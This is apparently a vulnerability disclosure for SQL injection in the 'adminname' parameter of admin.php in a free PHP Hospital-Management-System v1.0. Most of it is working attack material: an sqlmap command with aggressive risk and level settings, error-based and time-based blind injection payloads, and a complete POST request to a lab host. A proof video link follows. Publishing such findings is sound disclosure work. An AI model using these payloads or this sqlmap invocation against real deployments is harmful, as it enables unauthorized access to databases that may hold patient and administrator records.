**[Hospital-Management-System v1.0 - SQLi](https://itsourcecode.com/free-projects/php-project/hospital-management-system-in-php-with-source-code/)**
---

[Vendor](https://itsourcecode.com/author/unguardable/)
---

![image](https://user-images.githubusercontent.com/101170679/158853624-76a597d5-24e0-4e1a-a520-92c07b3d56f8.png)

### Description:
---
The vulnerability page is ```admin.php```


```http://you ip/HMS/admin.php```


Hospital-Management-System v1.0  
 
The ```adminname``` parameter in the ```admin.php``` page appears to be vulnerable to SQL injection attacks.


[+]sqlmap:


python3 sqlmap.py -r ```Your post packet.txt``` --random-agent --risk=3 --level=3 -dbs



[+] Payloads:
```
Parameter: adminname ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: adminname=admin' AND EXTRACTVALUE(4756,CONCAT(0x5c,0x717a706a71,(SELECT (ELT(4756=4756,1))),0x7170707a71)) AND 'hOiE'='hOiE&loginid=admin1&password=123456789&cnfirmpassword=123456789&select=Active&submit=%E6%8F%90%E4%BA%A4

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: adminname=admin' AND (SELECT 3117 FROM (SELECT(SLEEP(5)))xtHJ) AND 'beHE'='beHE&loginid=admin1&password=123456789&cnfirmpassword=123456789&select=Active&submit=%E6%8F%90%E4%BA%A4
---
```

[+]Post request package

```
POST /HMS/admin.php HTTP/1.1
Host: 192.168.10.7
Content-Length: 119
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.7
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.10.7/HMS/admin.php
Accept-Language: zh-CN,zh;q=0.9
Connection: close

adminname=admin1&loginid=admin1&password=123456789&cnfirmpassword=123456789&select=Active&submit=%E6%8F%90%E4%BA%A4

```
### In action:
---

![image](https://user-images.githubusercontent.com/101170679/158857104-ce7f9c15-5448-4c71-a347-071069d3ea94.png)

### Proof and Exploit:
---
[href](https://streamable.com/55gbsz)
